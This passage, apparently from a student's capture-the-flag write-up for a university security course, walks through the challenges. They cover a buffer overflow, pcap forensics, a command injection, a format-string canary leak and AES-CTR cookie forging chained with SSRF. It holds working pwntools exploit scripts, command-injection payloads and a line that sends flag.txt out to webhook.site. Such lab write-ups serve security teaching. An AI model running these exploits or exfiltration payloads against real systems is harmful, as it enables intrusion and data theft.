+p.recvuntil(b"Press ENTER to return to menu.\n")
+p.sendline(b"")
+
+# go to bake
+p.recvuntil(b"Option: ")
+p.sendline(b"3")
+
+# bake some danger
+p.recvuntil(b"Input to bake your pie: ")
+payload = b'A' * 0x30 + b'B' * 8 + p64(target_function_address)
+p.sendline(payload)
+
+print(p.recvall(timeout=500))
+```
+
+### Results
+
+```text
+python ./script.py
+[+] Opening connection to cs2107-ctfd-i.comp.nus.edu.sg on port 5002: Done
+Gotten: 0x6325b7a1462b, calculated address: 0x6325b7a1427c
+[+] Receiving all data: Done (133B)
+[*] Closed connection to cs2107-ctfd-i.comp.nus.edu.sg port 5002
+b'\nBaking pie...\n\nYour pie has been baked. Please proceed to the factory to collect it :)\n\nGood job!\nCS2107{7h4nk5_4_unl1m1t3d_4cc355!}'
+```
+
+Key: `CS2107{7h4nk5_4_unl1m1t3d_4cc355!}`
+
+## M.2 rogue creator
+
+Categories: 
+- Forensics Analysis
+
+Author: Jonathan Loh
+
+Prompt:
+
+
+```text
+One of our challenge creators was hacked while preparing the challenge. Fortunately, he saved the flag somewhere and it was captured by our network monitor.
+```
+
+Hints: None
+
+Attachments:
+- `capture.pcap`
+- `sslkey.log`
+
+### Sniff Sniff
+
+Very sad. Anyways, we open up the pcap in *Wireshark* and it is a dump of data! 41754 lines of entries.
+
+![wireshark](@assets/cs2107-assignment-02/M.2/01.png)
+
+There are a lot of "Protected" packets. This is where the `sslkey.log` comes in useful. Going to `Edit > Preferences > Protocol > TLS` I can load the ssl log file, which immediately reprocesses all the packets when settings are applied. I filter the results for only `TLS` which honestly just removes 2 entries, and then exported the results to `export.json`.
+
+### Naive Search
+
+I tried to search all the websites requested, with `rg -i '"http[\d]*.request.full_uri": "[^"]*"' --only-matching --no-filename --no-line-number | sort -u` and then used neovim to clean up the data. I noticed some interesting stuff, like:
+
+![uris](@assets/cs2107-assignment-02/M.2/02.png)
+
+The last [link](https://www.youtube.com/watch?v=dQw4w9WgXcQ) it a favourite of many!
+
+I also saw those *Google Drive* links. Using a macro (`qq` to record to *q*, then `gx` to open link and `j` to go down to next, `q` to stop recording, then `22@q` to repeat 22 times) I looked through every drive link. It was all just slides and tutorial sheets. I also tried looking at the *Github* links and the *CTF* links too, but to no avail. 
+
+### Looking at the Right Places
+
+Feeling defeated, I re-read the prompt. He *saved* the flag. That means he would have **POST**-ed the flag to the online source. So I went back to Wireshark and do a filter for `http.request.method == "POST"` and thankfully it was only a handful of packets.
+
+
+![POST packets](@assets/cs2107-assignment-02/M.2/03.png)
+
+I exported them to `post.json` and then opened it in vim.
+
+### Results
+
+![unsafe packets](@assets/cs2107-assignment-02/M.2/04.png)
+
+Key: `CS2107{s0m3One_t01d_Me_ss1_w4S_s4f3}`
+
+## M.3 checkflag
+
+Categories: 
+- Web Security
+
+Author: River Koh
+
+Prompt:
+
+
+```text
+I assure you that flag.txt is there, you can even check it yourself. But no reading!
+
+http://cs2107-ctfd-i.comp.nus.edu.sg:5005
+```
+
+Hints: None
+
+Attachments:
+- `dist.zip`
+
+### Exploration
+
+True, the flag is there, but it's fake! Here are the contents of the zip file:
+
+
+```tree
+.
+├── app.py
+├── dockerfile
+└── flag.txt
+```
+
+The dockerfile seems very standard:
+
+
+```dockerfile
+# Use a minimal base image to reduce the attack surface
+FROM python:3.9-slim
+
+# Create a non-root user
+RUN useradd -ms /bin/bash ctfuser
+
+# Set working directory
+WORKDIR /app
+
+# Copy the application code
+COPY app.py /app
+
+# Create a flag file
+COPY flag.txt /app/flag.txt
+
+# Install necessary dependencies
+RUN pip install flask
+
+# Set permissions to restrict access
+RUN chown -R ctfuser:ctfuser /app && chmod 700 /app && chmod 600 /app/flag.txt
+
+# Drop privileges to non-root user
+USER ctfuser
+
+# Run the Flask app
+CMD ["python3", "app.py"]
+```
+
+Let's see `app.py`:
+
+
+```py 
+from flask import Flask, request
+import os 
+
+app = Flask(__name__)
+
+@app.route('/', methods=['POST'])
+def check():
+    file = request.form.get('file')
+    response = os.system(f'[ -f {file} ]')
+    if response == 0:
+        return f'File {file} exists'
+    else:
+        return f'File not found'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+```
+
+Ok, trying to access the link gives an error since we are supposed to request by `POST`. Using curl:
+
+
+```bash
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt"
+```
+
+We get a `File flag.txt exists` as response. This is good. We also see a lack of sanitisation, so something like `"file=flag.txt ]; [ true"` will yield a positive result `File flag.txt ]; [ true exists`. We now have a way to interact with the files on the system. We cannot get the output directly from the response, but we can use the method we used in [the markdown parser challenge](#e3-markdown-parser) to create a loaded query to our dear webhook. The curl will attempt to connect to our website, with parameters being the contents of the flag file.
+
+### Exploitation
+
+We are able to send this:
+
+
+```bash
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; echo https://webhook.site/<UNIQUE_URL>?flag=\$(cat flag.txt) && [ true"
+```
+
+To get this, with knowledge that it worked since the `&&` would cause this to return non-zero if our payload fails:
+```
+File flag.txt ]; echo https://webhook.site/<UNIQUE_URL>?flag=$(cat flag.txt) && [ true exists  
+```
+
+### Payload?
+
+Now to craft the curl request.
+
+
+```bash 
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; curl https://webhook.site/<UNIQUE_URL>?flag=\$(cat flag.txt) && [ true"
+```
+
+Returns `File not found`. Oops. I probabily need to escape the url. Before that, let me check if `curl` even works:
+
+
+```bash
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; curl \"www.google.com\" && [ true"
+```
+
+Returns `File not found`. Since this is a minimal setup, probably `curl` is not loaded by default. `wget` doesn't work either. But trying `python -V` works, since this prints the version, the response `File flag.txt ]; python -V  exists` indicates python does work in this manner, as well as the flags. So I can throw a quick python one-liner to post the information. This is our payload:
+
+
+```bash
+python3 -c "import requests, sys; print(requests.get(f'https://webhook.site/<UNIQUE_URL>?data={open(sys.argv[1]).read().strip()}').text)" flag.txt
+```
+
+Anyways this does not work because the server does not have `requests`, when trying a minimal payload of just trying to import `requests`. The server does have `http.client`, so we can use that instead. It does start getting messy because of the escaping of quotes. A little known secret is that consecutive strings in bash gets concatenated. So if one needs to escape `'` in a literal `' '` single quotes:
+1. close the quote with `'`
+1. Add a double quote string with a single quote to add inside: `"'"`
+1. Make sure the double quotes are escaped if inside another double-quote string
+1. Open back the single quote `'`
+
+### Payload.
+
+```bash 
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client; conn = http.client.HTTPSConnection('\"'\"'webhook.site'\"'\"');' && [ true"
+```
+
+This is how I slowly test, step by step. If there's logging and some active checking, I would have been banned already.
+
+
+```bash
+
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client;' && [ true"
+
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client; conn = http.client.HTTPSConnection('\"'\"'webhook.site'\"'\"');' && [ true"
+
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client; conn = http.client.HTTPSConnection('\"'\"'webhook.site'\"'\"');flag = open('\"'\"'flag.txt'\"'\"').read().strip();' && [ true"
+
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client; conn = http.client.HTTPSConnection('\"'\"'webhook.site'\"'\"');flag = open('\"'\"'flag.txt'\"'\"').read().strip(); ' && [ true"
+
+curl -X POST "http://cs2107-ctfd-i.comp.nus.edu.sg:5005" -d "file=flag.txt ]; python3 -c 'import http.client; conn = http.client.HTTPSConnection('\"'\"'webhook.site'\"'\"');flag = open('\"'\"'flag.txt'\"'\"').read().strip(); conn.request('\"'\"'GET'\"'\"', f'\"'\"'/<UNIQUE_URL>?flag={flag}'\"'\"');' && [ true"
+```
+
+### Results
+
+And we got the request on *webhook*.
+
+![request](@assets/cs2107-assignment-02/M.3/01.png)
+
+Key: `CS2107{y3s_th3_fl4g_d0es_ex15ts}`
+
+# Hard Challenges
+
+## H.1 watchdogs
+
+Categories: 
+- Application Security
+- Binary Exploitation
+- Pwn
+
+Author: Cao Yitian
+
+Prompt:
+
+
+```text
+Welcome to SYSADMIN 31337, our state-of-the-art authentication and system administration system! I was told that there were some bad code in our source code which could result in the system being hacked, but I don't believe them!
+
+This is a direct step up from the medium challenge. This time, the stack canary is enabled. Use GDB to dynamically analyse your stack!
+
+nc cs2107-ctfd-i.comp.nus.edu.sg 5003
+```
+
+Hints:
+1. Your exploit chain should be similar to the medium challenge. Here are some supplementary guides on the [stack canary](https://book.jorianwoltjer.com/binary-exploitation/stack-canaries)
+2. The stack layout should look like this: variable(s) + any additional stack vars (?? bytes) + stack canary (16 bytes) + rbp (8 bytes) + rip (to be overwritten)
+
+Attachments:
+- `dist.zip`
+
+### Code
+
+This file has lesser lines than [the previous challenge](#m1-slice-of-pie) so let's paste it here:
+
+
+```c
+// omitted for brevity
+
+int win() {
+    char* argv[3] = {"/bin/cat", "flag.txt", NULL};
+    printf("Good job!\n");
+    execve("/bin/cat", argv, NULL);
+}
+
+int initialize() {
+    char buf[0x20];
+    printf("\033[1;92m");
+    printf("Please enter your username:\n");
+    fgets(buf, 0x20, stdin);
+    printf("\n\nWelcome, ");
+    printf(buf);
+    sleep(1);
+}
+
+int check_status() {
+    printf("Checking status...\n");
+    sleep(1.5);
+    printf("\033[1;91m");
+    printf("SYSADMIN 31337 ver. 2.10.7\n");
+    printf("Status: OK\n");
+    printf("Mainframe access: LOCKED\n");
+    printf("User status: USER\n");
+    printf("User level: LEVEL 1 ACCESS\n");
+    printf("\033[1;92m");
+    printf("\nPress enter to return to menu\n");
+    getchar();
+}
+
+int access_mainframe() {
+    char buf[0x30];
+    printf("Please enter your super secret access key:\n");
+    gets(buf);
+    printf("\033[1;91m");
+    printf("Access denied! Admins have been notified of attempted access.\n");
+    printf("\033[1;92m");
+    sleep(2);
+}
+
+int menu() {
+    char input[4];
+
+    initialize();
+
+    while(1) {
+        printf("\n\n\n\n\n\n");
+        // omitted for brevity
+        printf("\033[1;92m");
+        printf("\n1. Check status\n");
+        printf("2. Access mainframe\n");
+        printf("3. Exit\n");
+        printf("\nOption: ");
+        fgets(input, 4, stdin);
+        switch(atoi(input)) {
+            case 1:
+                check_status();
+                break;
+            case 2:
+                access_mainframe();
+                break;
+            case 3:
+                printf("Exiting system...\n");
+                printf("Goodbye\n");
+                exit(0);
+                break;
+            default:
+                printf("Invalid choice!\n");
+                sleep(1.5);
+                continue;
+        }
+    }
+}
+
+int main() {
+    setup();
+    menu();
+}
+
+```
+
+I removed many lines of design but I have to do this some justice. This is how it looks:
+
+![eleet](@assets/cs2107-assignment-02/H.1/01.png)
+
+Very *eleet* indeed. Let's start disecting this file for issues:
+1. `initialize()`: `printf(buf)` is vulnerable to fmtstr injection attacks.
+2. `access_mainframe()`: `gets(buf)` is vulnerable to overflow 
+
+Particularly, trying to overflow causes this:
+
+```
+Access denied! Admins have been notified of attempted access.                                                                
+*** stack smashing detected ***: terminated                                                                                  
+zsh: IOT instruction  ./watchdogs 
+```
+
+There are stack canaries, and these little canary birds get corrupted because of the overflow, and the programme crashes-and-burns. Not much issues in the security of the programme. But ~~**low crime does not mean no crime**~~ *hashtag hormat (SPF)[https://www.instagram.com/sgagsg/p/C18bDYgOicf/]*.
+
+### Disassembly
+
+Looking at the disassembled code, the stack is checked in this manner:
+
+#### Understanding and Leaking the Canary
+
+**Initilisation**
+
+```nasm 
+; old $rbp is saved         $rsp = -0x08[stack]
+00001481  55                 push    rbp {__saved_rbp}              
+; $rbp is now at $rsp       $rbp = -0x08[stack]
+00001482  4889e5             mov     rbp, rsp {__saved_rbp}         
+; 0x40 bytes space in stack $rsp = -0x48[stack]
+;   it is actually 0x30 for this function
+;   + 0x10 for the canary
+00001485  4883ec40           sub     rsp, 0x40                      
+                                                                    
+; $rax is now $fs:0x28
+00001489  64488b0425280000…  mov     rax, qword [fs:0x28]           
+; save 0x8 bytes $rax into the stack at $rbp-0x08
+00001492  488945f8           mov     qword [rbp-0x8 {var_10}], rax  
+```
+
+**Check**
+
+```nasm 
+; load the canary in $rbp-0x08 into $rax
+000014fa  488b55f8           mov     rdx, qword [rbp-0x8 {var_10}]  
+; subtract the canary with $fs:0x28 
+000014fe  64482b1425280000…  sub     rdx, qword [fs:0x28]           
+; jump over the fail state if "equal"
+00001507  7405               je      0x150e                         
+; which is just checking the zero-flag
+                                                                    
+; but effectively tests if [$rbp-0x8] == [$fs:0x28]
+00001509  e8f2fbffff         call    __stack_chk_fail               
+{ Does not return }
+
+; jump here if canary intact
+0000150e  c9                 leave    {__saved_rbp}                 
+0000150f  c3                 retn     {__return_addr}
+
+```
+
+This tells us that the canary is basically stored at `$rbp-0x8`. If we run the programme in GDB/GEF, break in the `initialize()` function, and step until the second `printf` function call, we can run `reg` and see the current state
+
+```text
+$rsp   : 0x00007fffffffdad0
+$rbp   : 0x00007fffffffdb00
+```
+
+Doing a little math to figure out the position of the canary and return address:
+
+```
+    0x00007fffffffdad0 - 0x00007fffffffdb00 = 0x30
+    0x30 / 8 = 6 positions of %p 
+
+    (rel from $rbp)
+    -0x37 to -0x30: arg 6
+    -0x2F to -0x28: arg 7
+    -0x27 to -0x20: arg 8
+    -0x1F to -0x18: arg 9
+    -0x17 to -0x10: arg 10
+    -0x0F to -0x08: arg 11 <- canary
+    -0x07 to  0x00: arg 12 <- $rbp (at $rbp-0x0)
+     0x01 to  0x08: arg 13 <- return address
+```
+
+Let's analyse the stack with this knowledge:
+
+```text
+            +----------+ 
+      0x08  | ret addr | \
+            +-        -+ |
+      0x07  | ret addr | |
+            +-        -+ |
+      0x06  | ret addr | |
+            +-        -+ | our target
+      0x05  | ret addr | | "argument 13"
+            +-        -+ |
+      0x04  | ret addr | |
+            +-        -+ |
+      0x03  | ret addr | |
+            +-        -+ |
+      0x02  | ret addr | |
+            +-        -+ |
+      0x01  | ret addr | /
+            +----------+ 
+     -0x00  | old rbp  | \ 
+            +-        -+ |
+     -0x01  | old rbp  | |
+            +-        -+ |
+     -0x02  | old rbp  | |
+            +-        -+ |
+     -0x03  | old rbp  | |
+            +-        -+ |
+     -0x04  | old rbp  | | "argument 12"
+            +-        -+ |
+     -0x05  | old rbp  | |
+            +-        -+ |
+     -0x06  | old rbp  | |
+            +-        -+ |
+     -0x07  | old rbp  | |
+            +----------+ /
+     -0x08  |  canary  | \ <- $rbp  
+            +-        -+ |
+     -0x09  |  canary  | |  
+            +-        -+ |
+     -0x0A  |  canary  | |  
+            +-        -+ |
+     -0x0B  |  canary  | | our target
+            +-        -+ | "argument 11"
+     -0x0C  |  canary  | |  
+            +-        -+ |
+     -0x0D  |  canary  | |  
+            +-        -+ |
+     -0x0E  |  canary  | |  
+            +-        -+ |
+     -0x0F  |  canary  | |
+            +----------+ /
+     -0x10  |  arg 10  |
+            +-        -+
+              ........
+            +-        -+
+     -0x37  |  arg  6  | 
+            +----------+ 
+     -0x38  |          | <- rdi (also arg0)
+            +----------+ 
+```
+
+If we leak the canary **and** the return address from `initialize()`, we can override the return address of `access_mainframe()` while preserving the canary. This can be done with inputting `%13$p,$11$p` to get the return address and canary, which can be split by the comma delimiter. 
+
+#### Injection
+
+Next is figuring out how to inject the values.
+
+
+```nasm 
+000014a7  488d45c0           lea     rax, [rbp-0x40 {buf}]
+000014ab  4889c7             mov     rdi, rax {buf}
+000014ae  b800000000         mov     eax, 0x0
+000014b3  e8a8fcffff         call    gets
+```
+The disassembly code tells us that the value we input gets written to $rbp-0x40.
+
+
+```text
+            +----------+ 
+      0x08  | ret addr | \
+            +-        -+ |
+      0x07  | ret addr | |
+            +-        -+ |
+      0x06  | ret addr | |
+            +-        -+ | our target to override
+      0x05  | ret addr | | 
+            +-        -+ |
+      0x04  | ret addr | |
+            +-        -+ |
+      0x03  | ret addr | |
+            +-        -+ |
+      0x02  | ret addr | |
+            +-        -+ |
+      0x01  | ret addr | /
+            +----------+ 
+     -0x00  | old rbp  | \ 
+            +-        -+ |
+     -0x01  | old rbp  | |
+            +-        -+ |
+     -0x02  | old rbp  | |
+            +-        -+ |
+     -0x03  | old rbp  | |
+            +-        -+ |
+     -0x04  | old rbp  | | we can ignore this
+            +-        -+ |
+     -0x05  | old rbp  | |
+            +-        -+ |
+     -0x06  | old rbp  | |
+            +-        -+ |
+     -0x07  | old rbp  | |
+            +----------+ /
+     -0x08  |  canary  | \ <- $rbp  
+            +-        -+ |
+     -0x09  |  canary  | |  
+            +-        -+ |
+     -0x0A  |  canary  | |  
+            +-        -+ |
+     -0x0B  |  canary  | | our target to preserve
+            +-        -+ | 
+     -0x0C  |  canary  | |  
+            +-        -+ |
+     -0x0D  |  canary  | |  
+            +-        -+ |
+     -0x0E  |  canary  | |  
+            +-        -+ |
+     -0x0F  |  canary  | |
+            +----------+ /
+     -0x10  |          |
+            +-        -+
+              ........
+            +-        -+
+     -0x47  |          | 
+            +----------+ 
+     -0x48  |          | <- rsp
+            +----------+ 
+
+```
+
+There are 0x38 bytes from where input is written to where the canary is. Hence we will pad 0x38 bytes of nonsense, then 8 bytes of our canary, then 8 bytes of nonsense again, and finally our 8 bytes of calculated return address to `win()`.
+
+#### Payload
+
+```py 
+from pwn import *
+
+# do not show all those connecting messages
+context.log_level = 'error'
+
+
+# Connect to the remote service
+p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5003)
+p.recvuntil(b"Please enter your username:\n")
+p.sendline(bytes(r'%13$p,%11$p', "utf-8"))
+data = p.recvuntil(b"\033[1;91m")
+
+# remove the front and back
+data = data[len(b"\n\nWelcome, "):-len(b"\n\n\n\n\n\n\n\x1b[1;91m")]
+ret_addr, canary = data.split(b",")
+target_function_address = int(ret_addr,0) - 0x1535 + 0x12BC
+canary = int(canary, 0)
+print(f"Gotten: {ret_addr}, calculated address: {hex(target_function_address)}")
+print(f"Canary:{hex(canary)}")
+
+p.recvuntil(b"Option: ")
+p.sendline(b"2")
+
+p.recvuntil(b"Please enter your super secret access key:\n")
+payload = b'A' * 0x38 + p64(canary) + b'B' * 8 + p64(target_function_address)
+p.sendline(payload)
+
+# drop to interactive because we might get it, or get stuck with stack smashing 
+#   error message, or return back to menu with the large ascii-art
+p.interactive()
+```
+
+#### Results
+
+```text 
+Gotten: b'0x5dfac7ad4535', calculated address: 0x5dfac7ad42bc
+Canary:0x23bbb9ed1c839f00
+Access denied! Admins have been notified of attempted access.
+Good job!
+CS2107{m4st3r_0f_pwn_mr_r0b0t_1337_h4ck3rm@n}$
+```
+
+Key: `CS2107{m4st3r_0f_pwn_mr_r0b0t_1337_h4ck3rm@n}`
+
+## H.2 Stalking Githubs
+
+Categories: 
+- Web Security
+
+Author: Lee Kai Xuan
+
+Prompt:
+
+
+```text
+Did you know our famous jloh02 is a core maintainer of NUSMods?
+
+Didn't know? Now you know!
+
+Also there's a cool internal service that allows you to look at cats. Not sure if it's important but yea
+
+http://cs2107-ctfd-i.comp.nus.edu.sg:5006
+```
+
+Hints:
+1. Don't worry about finding the whole solution at one go - focus on 1 exploit at a time, then finally focusing on how you can chain these exploits together.
+2. I would recommend installing and using [Docker](https://docs.docker.com/) to run the instance locally. Adding print statements to the server everywhere can go a long way!
+
+Attachments:
+- `stalking-githubs.zip` 
+
+### Exploration
+
+This is the file structure:
+
+
+```tree
+.
+├── docker-compose.yaml
+├── service
+│   ├── assets
+│   │   └── image.png
+│   ├── Dockerfile
+│   └── service.py
+└── web
+    ├── app.py
+    ├── Dockerfile
+    └── templates
+        └── github.html
+```
+
+Looking at the `docker-compose`:
+
+
+```yaml 
+services:
+  web:
+    container_name: web
+    build:
+      context: web
+    restart: always
+    ports:
+      - 5006:5000
+
+  service:
+    container_name: service
+    image: service:latest
+    build:
+      context: service
+    environment:
+      - FLAG=CS2107{fake_flag}
+    restart: always
+    read_only: true
+# omitted for brevity
+```
+
+There are 2 containers, *web* and *service*. *web* is the one we can interface as it is exposed to port `5006`, while *service* is not public facing, but contains the flag as an environment variable. We can look at what *service* has to offer, by glancing at `service.py`:
+
+
+```py 
+# omitted for brevity
+@app.get("/")
+async def read_file(file: str = "image.png"):
+    # Prevent file traversal 1
+    file = file.replace("../", "")
+    # Prevent file traversal 2
+    file_path = Path("assets") / file
+    if file_path.exists:
+        contents = file_path.read_bytes()
+        return Response(contents, headers={"Content-Type": magic.from_buffer(contents)})
+    raise HTTPException(status_code=404)
+```
+
+Any file requested to service will be retrieved from the `assets` file, which currently holds a cute little cat:
+
+![cat](@assets/cs2107-assignment-02/H.2/01.png)
+
+There are **some** protection against path traversal, but ~~LOW CRIME DOESNT MEA~~ there are more ways to go about this. We will discuss this when we get there. The `dockerfile` looks normal. We will take note of this line:
+
+
+```dockerfile 
+CMD ["python", "-m", "uvicorn", "--host", "0.0.0.0", "service:app"]
+```
+
+Which indicates to us that to access `service.py` we will need to access `service:8000` as mentioned by *uvicorn*:
+
+> `--host <str>` - Bind socket to this host. Use `--host 0.0.0.0` to make the application available on your local network. IPv6 addresses are supported, for example: `--host '::'`. Default: `127.0.0.1`.
+> `--port <int>` - Bind to a socket with this port. Default: `8000`.
+
+Moving to the *web* folder, the `dockerfile` is a normal *flask* setup. The template file contains a `github.html` file. I want to focus on the form section:
+
+
+```html
+    <form id="form" action="/github" method="POST">
+        <label for="username">Github username:</label>
+        <input type="text" id="username" name="username" required placeholder="jloh02">
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+    document.getElementById('form').onsubmit = onsubmit;
+
+    function onsubmit(){
+        var x = document.getElementById("username").value;
+        document.getElementById("username").value = "/" + x;
+    }
+    </script>
+```
+Something interesting is the addition of the `/` into the query before the `username` gets submitted. We will probably want to bypass this. This also submits a `POST` to the `/github` path. Right now trying to access the `/github` page on the live server redirects to the base path. Accessing the website right now actually gives this response:
+
+
+```text
+Cookie set! Refresh to see your status.
+```
+
+Indeed, a new cookie is set:
+
+![cookie set](@assets/cs2107-assignment-02/H.2/02.png)
+
+The cookie value is: `A0ecrjfcDrotze64WjplPgUfeaFZr0QIC7QrlYB0VCGprnAHUPQfP1ejNI0=`. Looks like base64.
+
+Refreshing the site shows our dear `jloh02`'s *Github* profile, but with a banner:
+
+![banner](@assets/cs2107-assignment-02/H.2/03.png)
+
+**I AM** ~~STEVE~~ `EF79c`.
+
+Let's look at the mind of this beast:
+
+- This tells us that the key is 16-bytes and the nonce is 8-bytes.
+
+
+    ```py 
+    key = os.urandom(16)
+    nonce = os.urandom(8)
+    ```
+- This tells us that Counter-mode AES with nonce is used. The nonce is the first 8 bytes, and the cipher is the remaining code, with the plaintext being a JSON dump of a dictionary. 
+
+
+    ```py 
+
+    def encrypt_cookie(data_dict):
+        plaintext = json.dumps(data_dict).encode()
+        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
+        ciphertext = cipher.encrypt(plaintext)
+        return base64.b64encode(nonce + ciphertext).decode()
+
+
+    def decrypt_cookie(cookie_value):
+        decoded = base64.b64decode(cookie_value)
+        nonce_from_cookie = decoded[:8]
+        ciphertext = decoded[8:]
+        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce_from_cookie)
+        plaintext = cipher.decrypt(ciphertext)
+        return json.loads(plaintext.decode())
+
+    ```
+- This restricts any path that is `admin_only` to those whose cookie has the `is_admin` set to true. Else it redirects to `/` which is what we saw when trying to access `/github`.
+
+
+    ```py 
+
+    def admin_only(f):
+        @wraps(f)
+        def wrap(*args, **kwargs):
+            cookie = request.cookies.get("session")
+            with contextlib.suppress(Exception):
+                data = decrypt_cookie(cookie)
+                if data.get("is_admin") is True:
+                    return f(*args, **kwargs)
+            return redirect("/")
+
+        return wrap
+
+    ```
+- This has the cookie construction logic, with the `user` being a 5 digit hexadecimal string. Ours is `EF79c`. By default, `is_admin` is `False`. 
+
+
+    ```py 
+
+    @app.get("/")
+    def index():
+        cookie = request.cookies.get("session")
+        if cookie:
+            with contextlib.suppress(Exception):
+                data = decrypt_cookie(cookie)
+                if data.get("is_admin") is True:
+                    return "Welcome Admin!"
+                else:
+                    res = requests.get("http://github.com/jloh02")
+                    return f"Hello, {data.get('user')}! You can only have access to our famous jloh02 github!\n\n\n{res.text}"
+
+        # Default cookie
+        data = {"user": "".join(random.choices(string.hexdigits, k=5)), "is_admin": False}
+        resp = make_response("Cookie set! Refresh to see your status.")
+        cookie_val = encrypt_cookie(data)
+        resp.set_cookie("session", cookie_val)
+        return resp
+
+
+    ```
+
+- This one is **important since there's an input vulnerability**. If we manage to get here, we can try to access `service.py`. We can exploit the nature of *URLs* and how they work.
+
+
+    ```py 
+    @app.route("/github", methods=["GET", "POST"])
+    @admin_only
+    def admin_stuff():
+        if request.method == "POST":
+            github = request.form["username"]
+            res = requests.get(f"http://github.com{github}")
+            print(res.headers)
+            return Response(
+                res.content,
+                mimetype=res.headers["Content-Type"],
+                headers={"Content-Disposition": "inline"},
+            )
+        return render_template("github.html")
+
+    ```
+    This is a common URL schema:
+
+    ```text
+        http://username:password@portal.example.com:80/path/to/something?key=value#fragment
+        |---|  |-------||------| |----| |-----| |-||-||----------------| |-------| |------|
+        scheme          optional  sub    main   TL port  path to item       query    to scope 
+               ^^^^^^^^^^^^^^^^^  ^^^    ^^^^   ^^                                 into parts
+               |-not used now--| |---- domain ----|                                of file
+    ```
+
+     What the `app.py` expects is a `/` with a path, of the *domain* `www.github.com`
+    
+
+    ```text
+        http://github.com/jloh02
+        |---|  |----||--||-----|
+        scheme  main  TL  path to
+                ^^^^  ^^  user profile
+               |-domain-|
+    ```
+
+     If we can send our `path` without the query, we can achieve something like:
+
+
+    ```text
+        http://github.com@service:8000/image.png
+        |---|  |--------|  |-------| |--| |-------|
+        scheme username      domain  port  path 
+    ```
+
+    This should give us a cat picture ehehe.
+
+To recap, this challenge comes in two parts:
+1. accessing the admin page 
+2. accessing the flag from the admin page
+
+### Poisoned Cookie 
+
+~~Drink some milk to negate the poison!~~ Let's get back our session cookie and `user`. We know the first part is the nonce, and this is *Base64*. We also know the plaintext.
+
+
+```py
+import json
+import base64
+
+dictionary = {
+    "user": "EF79c",
+    "is_admin": False
+} 
+json_dump = json.dumps(dictionary) 
+
+
+encoded = "A0ecrjfcDrotze64WjplPgUfeaFZr0QIC7QrlYB0VCGprnAHUPQfP1ejNI0="
+decoded = base64.b64decode(encoded)
+nonce = decoded[:8]
+ciphertext = decoded[8:]
+plaintext = json_dump.encode() # '{"user": "EF79c", "is_admin": false}'
+```
+
+We can extract the keystream because of how AES-CTR works (we don't even need the actual key!)
+
+
+```py 
+'''
+pseudocode of AES-CTR:
+    keystream <- AES_generate_keystream(key, nonce)
+    for i in range(len(ciphertext)):
+        ciphertext[i] = keystream[i] ^ plaintext[i]
+
+
+and because of the properties of xor, 
+    ciphertext[i] = keystream[i] ^ plaintext[i] 
+means 
+    keystream[i] = ciphertext[i] ^ plaintext[i]
+
+'''
+
+def xor_bytes(a, b): 
+    # why loop when you can zip
+    return bytes(x^y for x,y in zip(a, b))
+
+keystream = xor_bytes(ciphertext, plaintext)
+
+```
+
+We can also craft our malicious cookie session, since there is no server-side state check on what valid cookies were served.
+
+
+```py
+malicious_dict = {
+    "user": "EF79c",
+    "is_admin": True
+} 
+malicious_json_dump = json.dumps(malicious_dict) 
+malicious_plaintext = malicious_json_dump.encode() # '{"user": "EF79c", "is_admin": true}'
+malicious_ciphertext = xor_bytes(keystream, malicious_plaintext)
+malicious_cookie = base64.b64encode(nonce + malicious_ciphertext).decode()
+print(malicious_cookie)
+```
+
+And we get:
+
+```
+old: A0ecrjfcDrotze64WjplPgUfeaFZr0QIC7QrlYB0VCGprnAHUPQfP1ejNI0=
+new: A0ecrjfcDrotze64WjplPgUfeaFZr0QIC7QrlYB0VCGprnAHUPQNLE61LA==
+                                                        ^^^^^^^^^
+                                                        is_admin
+```
+We enter this in using *Firefox*'s developer console, in the *storage* tab:
+
+![malicious_cookie](@assets/cs2107-assignment-02/H.2/04.png)
+
+And when refreshed, we get: 
+
+![hello_admin](@assets/cs2107-assignment-02/H.2/05.png)
+
+**Hello Admin**
+
+We try to access `/github` and we successfully do:
+
+![github](@assets/cs2107-assignment-02/H.2/06.png)
+
+### We are admin
+
+Immediately, we must try sending the malicious test-string we crafted earlier
+    
+
+```text
+    http://github.com@service:8000/image.png
+    |---|  |--------|  |-------| |--| |-------|
+    scheme username      domain  port  path 
+```
+
+We can first try to submit a legitimate username like *jloh02* and then edit the sent packet's payload to submit our own payload, `@service:8000/image.png`. This bypasses the extra `/` added by the webpage's submit button. This is usually the first entry when pressing the button after opening the network tab. We can right-click and *Edit and Resend*.
+
+
+![malicious_post](@assets/cs2107-assignment-02/H.2/07.png)
+
+Hey, that's not a cat pic!
+
+![no_cat_pic](@assets/cs2107-assignment-02/H.2/08.png)
+
+But it is better than an invalid response redirecting back to "Your cookie is set!" (Ask me how I know.... I forgot to change `localhost` to `service` and this caught me in a loop for awhile). Simply going to `service:8000/` should load the default path (the cat image) so we shall try that. 
+
+This results in a very very long string as the response. Throwing this into *CyberChef* tells me it is a *B64: Base64-encoded PNG file*. Yay cat pic!
+
+![yes_cat_pic](@assets/cs2107-assignment-02/H.2/09.png)
+
+Now we need to be careful. We can't even get the image path right, but we need to extract the environment variable. (I figured out why - I am supposed to pass the image name as a query with key of `file`. So something like `@service:8000/?file=image.png` works.)
+
+
